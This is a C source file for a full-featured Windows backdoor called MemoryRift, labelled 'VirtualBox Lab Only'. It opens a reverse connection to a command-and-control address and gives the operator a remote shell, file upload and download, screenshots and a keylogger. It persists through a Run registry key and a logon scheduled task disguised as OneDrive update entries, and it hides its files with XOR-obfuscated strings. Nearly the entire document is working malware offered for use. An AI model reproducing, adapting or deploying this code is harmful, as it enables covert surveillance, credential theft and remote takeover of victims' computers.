// ===================================================================
// MemoryRift - FULL FEATURED BACKDOOR (backdoor3o.exe)
//  (VirtualBox Lab Only)
// Features: screenshot, download, upload, cat, keylogger, persist, cd, cmd, vuln
// Architecture: Connect FIRST, persist AFTER (so connection is immediate)
// ===================================================================

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <winreg.h>
#include "keylogger.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define BUFFER_SIZE 4096
#define RECONNECT_INTERVAL 5000

char ip_plain[] = "192.168.56.104"; // <<< YOUR KALI IP

// ── XOR obfuscation ─────────────────────────────────────────────────
const char XOR_KEY = 0xAA;
void xor_decode(char* str) {
    if (!str) return;
    for (int i = 0; str[i] != '\0'; i++) str[i] ^= XOR_KEY;
}

// ── Thread-safe send lock (shared with keylogger.h) ─────────────────
CRITICAL_SECTION g_send_cs;
volatile LONG    g_keylog_paused = 0;

char mutex_obf[]      = "\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\x00";
char target_dir_obf[] = "\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\x00";
char target_name_obf[]= "\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\x00";
char debug_log_obf[]  = "\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\xE6\x00";

char task_name[] = "OneDriveStandaloneUpdateTask";
char reg_name[]  = "OneDriveStandaloneUpdateHelper";

// ── Debug logging ───────────────────────────────────────────────────
void write_debug(const char* msg) {
    char path[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, path);
    strcat(path, "memoryrift.log");
    FILE* f = fopen(path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}

// ── Persistence (registry + scheduled task, NO self-migration) ──────
int install_persistence() {
    char original[MAX_PATH] = {0};
    char target[MAX_PATH] = {0};
    char target_dir[MAX_PATH] = {0};

    GetModuleFileNameA(NULL, original, MAX_PATH);

    char tdir[64]; strcpy(tdir, target_dir_obf); xor_decode(tdir);
    char tname[64]; strcpy(tname, target_name_obf); xor_decode(tname);

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, target_dir);
    strcat(target_dir, "\\");
    strcat(target_dir, tdir);
    CreateDirectoryA(target_dir, NULL);
    sprintf(target, "%s\\%s", target_dir, tname);

    // Copy ourselves to persistent location (but DON'T exit)
    if (_stricmp(original, target) != 0) {
        CopyFileA(original, target, FALSE);
        SetFileAttributesA(target, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        write_debug("Copied to persistent location");
    }

    // Registry Run key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, reg_name, 0, REG_SZ,
            (const BYTE*)target, (DWORD)strlen(target) + 1);
        RegCloseKey(hKey);
        write_debug("Registry persistence added");
    }

    // Scheduled task (best effort, may need admin)
    char cmd[1024];
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    sprintf(cmd, "schtasks /delete /tn \"%s\" /f", task_name);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    sprintf(cmd, "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /f", task_name, target);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        write_debug("Scheduled task created");
    }

    return 1;
}

// ── Screenshot ──────────────────────────────────────────────────────
void send_screenshot(SOCKET sock) {
    write_debug("Taking screenshot...");

    // Pause keylogger sends so binary data is not interleaved
    InterlockedExchange(&g_keylog_paused, 1);
    Sleep(60);  // let any in-flight keylog send finish

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    HDC memdc = CreateCompatibleDC(hdc);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hbitmap = CreateCompatibleBitmap(hdc, width, height);
    HBITMAP old = (HBITMAP)SelectObject(memdc, hbitmap);
    BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD rowSize = ((width * 3 + 3) & ~3);
    DWORD pixelSize = rowSize * height;
    DWORD fileSize = 54 + pixelSize;

    char fileHeader[14] = {0};
    fileHeader[0] = 'B';
    fileHeader[1] = 'M';
    *(DWORD*)(fileHeader + 2) = fileSize;
    *(DWORD*)(fileHeader + 10) = 54;

    // Hold the send lock for the entire binary transfer
    EnterCriticalSection(&g_send_cs);

    // Send size line
    char sizebuf[32];
    sprintf(sizebuf, "%lu\n", fileSize);
    send(sock, sizebuf, strlen(sizebuf), 0);
    Sleep(200);

    // Send BMP data
    send(sock, fileHeader, 14, 0);
    send(sock, (char*)&bi, 40, 0);

    char* pixels = (char*)malloc(pixelSize);
    if (pixels) {
        GetDIBits(memdc, hbitmap, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        DWORD sent = 0;
        while (sent < pixelSize) {
            int chunk = (pixelSize - sent > 4096) ? 4096 : (pixelSize - sent);
            send(sock, pixels + sent, chunk, 0);
            sent += chunk;
        }
        free(pixels);
    }

    LeaveCriticalSection(&g_send_cs);

    // Resume keylogger
    InterlockedExchange(&g_keylog_paused, 0);

    SelectObject(memdc, old);
    DeleteObject(hbitmap);
    DeleteDC(memdc);
    ReleaseDC(hwnd, hdc);
    write_debug("Screenshot sent");
}

// ── Helper functions ────────────────────────────────────────────────
void trim(char* str) {
    if (!str) return;
    int len = strlen(str);
    while (len > 0 && (str[len-1] == '\n' || str[len-1] == '\r' || str[len-1] == ' ' || str[len-1] == '\t')) {
        str[--len] = '\0';
    }
}

// ── Command Shell ───────────────────────────────────────────────────
void CmdShell(SOCKET sock) {
    char buffer[BUFFER_SIZE];
    char logbuf[512];

    write_debug("CmdShell started - ready for commands");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) {
            write_debug("recv failed - connection lost");
            break;
        }
        buffer[bytes] = '\0';

        // Strip trailing whitespace/newlines from command
        while (bytes > 0 && (buffer[bytes-1] == '\n' || buffer[bytes-1] == '\r' || buffer[bytes-1] == ' ')) {
            buffer[--bytes] = '\0';
        }

        sprintf(logbuf, "CMD: [%s]", buffer);
        write_debug(logbuf);

        // ── quit ──
        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0) {
            write_debug("Quit received");
            closesocket(sock);
            WSACleanup();
            ExitProcess(0);
        }

        // ── cd ──
        else if (strncmp(buffer, "cd ", 3) == 0) {
            char* dir = buffer + 3;
            trim(dir);
            EnterCriticalSection(&g_send_cs);
            if (SetCurrentDirectoryA(dir)) {
                send(sock, "Directory changed\n", strlen("Directory changed\n"), 0);
            } else {
                send(sock, "Failed to change directory\n", strlen("Failed to change directory\n"), 0);
            }
            LeaveCriticalSection(&g_send_cs);
        }

        // ── keylog_start ──
        else if (strcmp(buffer, "keylog_start") == 0) {
            CreateThread(NULL, 0, logg, (LPVOID)sock, 0, NULL);
            send(sock, "Keylogger started!\n", strlen("Keylogger started!\n"), 0);
            write_debug("Keylogger thread started");
        }

        // ── persist ──
        else if (strcmp(buffer, "persist") == 0) {
            install_persistence();
            EnterCriticalSection(&g_send_cs);
            send(sock, "Persistence installed!\n", strlen("Persistence installed!\n"), 0);
            LeaveCriticalSection(&g_send_cs);
            write_debug("Persistence installed via command");
            continue; // no trailing \n terminator
        }

        // ── vuln ──
        else if (strncmp(buffer, "vuln ", 5) == 0) {
            EnterCriticalSection(&g_send_cs);
            send(sock, "[MemoryRift] Buffer overflow triggered!\n",
                 strlen("[MemoryRift] Buffer overflow triggered!\n"), 0);
            LeaveCriticalSection(&g_send_cs);
        }

        // ── screenshot ──
        else if (strcmp(buffer, "screenshot") == 0) {
            send_screenshot(sock);
            write_debug("Screenshot command completed");
            continue; // no trailing \n terminator
        }

        // ── download ──
        else if (strncmp(buffer, "download ", 9) == 0) {
            char* filename = buffer + 9;
            trim(filename);

            // Pause keylogger during binary transfer
            InterlockedExchange(&g_keylog_paused, 1);
            Sleep(60);

            FILE* fp = fopen(filename, "rb");
            if (fp) {
                fseek(fp, 0, SEEK_END);
                long size = ftell(fp);
                rewind(fp);

                EnterCriticalSection(&g_send_cs);
                char sizebuf[32];
                sprintf(sizebuf, "%ld\n", size);
                send(sock, sizebuf, strlen(sizebuf), 0);
                Sleep(100);

                char filebuf[4096];
                size_t r;
                while ((r = fread(filebuf, 1, sizeof(filebuf), fp)) > 0) {
                    send(sock, filebuf, r, 0);
                }
                LeaveCriticalSection(&g_send_cs);
                fclose(fp);
                sprintf(logbuf, "Sent file: %s (%ld bytes)", filename, size);
                write_debug(logbuf);
            } else {
                EnterCriticalSection(&g_send_cs);
                send(sock, "0\n", 2, 0);
                LeaveCriticalSection(&g_send_cs);
                write_debug("Download: file not found");
            }

            InterlockedExchange(&g_keylog_paused, 0);
            continue; // no trailing \n terminator
        }

        // ── upload ──
        else if (strncmp(buffer, "upload ", 7) == 0) {
            char* filename = buffer + 7;
            trim(filename);

            char sizebuf[32] = {0};
            int sb = recv(sock, sizebuf, sizeof(sizebuf) - 1, 0);
            if (sb > 0) {
                sizebuf[sb] = '\0';
                long size = atol(sizebuf);
                if (size > 0) {
                    FILE* fp = fopen(filename, "wb");
                    if (fp) {
                        char filebuf[4096];
                        long received = 0;
                        while (received < size) {
                            int r = recv(sock, filebuf, sizeof(filebuf), 0);
                            if (r <= 0) break;
                            fwrite(filebuf, 1, r, fp);
                            received += r;
                        }
                        fclose(fp);
                        send(sock, "Upload successful\n", strlen("Upload successful\n"), 0);
                        sprintf(logbuf, "Upload: %s (%ld bytes)", filename, received);
                        write_debug(logbuf);
                    } else {
                        send(sock, "Upload failed: cannot create file\n",
                             strlen("Upload failed: cannot create file\n"), 0);
                    }
                }
            }
        }

        // ── generic command (dir, systeminfo, ipconfig, type/cat, etc.) ──
        else {
            char fixed_cmd[BUFFER_SIZE];
            strcpy(fixed_cmd, buffer);

            // Convert 'cat' to 'type' for Windows
            if (strncmp(fixed_cmd, "cat ", 4) == 0) {
                char temp[BUFFER_SIZE];
                sprintf(temp, "type %s", buffer + 4);
                strcpy(fixed_cmd, temp);
            }

            sprintf(logbuf, "Executing: [%s]", fixed_cmd);
            write_debug(logbuf);

            FILE* fp = _popen(fixed_cmd, "r");
            if (fp) {
                char output[BUFFER_SIZE];
                int total = 0;
                while (fgets(output, sizeof(output), fp)) {
                    EnterCriticalSection(&g_send_cs);
                    send(sock, output, strlen(output), 0);
                    LeaveCriticalSection(&g_send_cs);
                    total += strlen(output);
                }
                _pclose(fp);
                sprintf(logbuf, "Output: %d bytes", total);
                write_debug(logbuf);
            } else {
                EnterCriticalSection(&g_send_cs);
                send(sock, "Command execution failed\n",
                     strlen("Command execution failed\n"), 0);
                LeaveCriticalSection(&g_send_cs);
                write_debug("_popen failed");
            }
        }

        // Send empty line as end-of-output terminator
        EnterCriticalSection(&g_send_cs);
        send(sock, "\n", 1, 0);
        LeaveCriticalSection(&g_send_cs);
    }
}

// ── Window proc (anti-close) ────────────────────────────────────────
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLOSE || msg == WM_DESTROY) return 0;
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// ── Main entry point ────────────────────────────────────────────────
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    char logbuf[512];

    write_debug("========================================");
    write_debug("MemoryRift STARTED");
    sprintf(logbuf, "Target C2: %s:50005", ip_plain);
    write_debug(logbuf);

    // Mutex - prevent duplicate instances
    char mutex_dec[64];
    strcpy(mutex_dec, mutex_obf);
    xor_decode(mutex_dec);
    HANDLE hMutex = CreateMutexA(NULL, TRUE, mutex_dec);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        write_debug("Another instance already running - EXITING");
        return 1;
    }

    FreeConsole();

    // Hidden message window
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MicrosoftUpdateClass";
    RegisterClass(&wc);
    CreateWindow("MicrosoftUpdateClass", NULL, 0, 0, 0, 0, 0,
                 HWND_MESSAGE, NULL, hInstance, NULL);

    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        write_debug("WSAStartup FAILED!");
        return 1;
    }
    write_debug("WSAStartup OK");

    // Initialize send critical section
    InitializeCriticalSection(&g_send_cs);
    write_debug("Send lock initialized");

    // Install persistence ONCE (non-blocking, no ExitProcess)
    install_persistence();
    write_debug("Persistence setup complete");

    // ── Connection loop ─────────────────────────────────────────────
    while (1) {
        write_debug("Creating socket...");
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            write_debug("socket() FAILED");
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(ip_plain);
        server.sin_port = htons(50005);

        sprintf(logbuf, "Connecting to %s:50005...", ip_plain);
        write_debug(logbuf);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            int err = WSAGetLastError();
            sprintf(logbuf, "connect() FAILED (WSA error %d) - retry in 5s", err);
            write_debug(logbuf);
            closesocket(sock);
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        write_debug("=== CONNECTED TO C2 SERVER ===");

        // Send banner with newline
        send(sock, "MemoryRift-Connected\n", strlen("MemoryRift-Connected\n"), 0);
        write_debug("Banner sent");

        // Handle commands
        CmdShell(sock);

        write_debug("Connection lost - reconnecting in 5s...");
        closesocket(sock);
        Sleep(RECONNECT_INTERVAL);
    }

    WSACleanup();
    return 0;
}
